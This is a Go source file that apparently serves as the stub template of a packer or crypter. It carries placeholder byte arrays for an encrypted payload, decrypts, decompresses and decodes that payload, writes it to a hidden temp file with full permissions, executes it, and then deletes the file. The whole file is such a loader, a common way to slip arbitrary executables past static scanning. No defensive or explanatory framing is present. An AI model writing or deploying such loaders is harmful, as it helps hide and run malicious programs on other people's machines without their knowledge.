package main

import (
    "fmt"
    "log"
    "os"
    "os/exec"
    "strconv"
    "strings"

    "github.com/Grant-Eckstein/blot"
)

func recvByteSlice(bs string) []byte {
	var bb []byte
	for _, ps := range strings.Split(strings.Trim(bs, "[]"), " ") {
		pi, _ := strconv.Atoi(ps)
		bb = append(bb, byte(pi))
	}
	return bb
}

func main() {

	// Read in iv
	beStr := fmt.Sprintf("INSERT_BE")
	be := recvByteSlice(beStr)

	// Read in iv
	ctStr := fmt.Sprintf("INSERT_CT")
	ct := recvByteSlice(ctStr)

	b := blot.Import(be)

    b.Add(b.Decrypt())
    b.Add(b.Decompress())
    b.Add(b.Decode())

    data := b.Run(ct)

	// Create temp file
	file, err := os.CreateTemp(".", ".*")
	if err != nil {
		log.Fatal(err)
	}
	defer os.Remove(file.Name())

	// Write to file
	err = os.WriteFile(file.Name(), data, 0777)
	if err != nil {
		log.Fatal(err)
	}

	err = os.Chmod(file.Name(), 0777)
	if err != nil {
		log.Fatal(err)
	}

	err = exec.Command(file.Name()).Run()

	if err != nil {
		log.Fatal(err)
	}
}
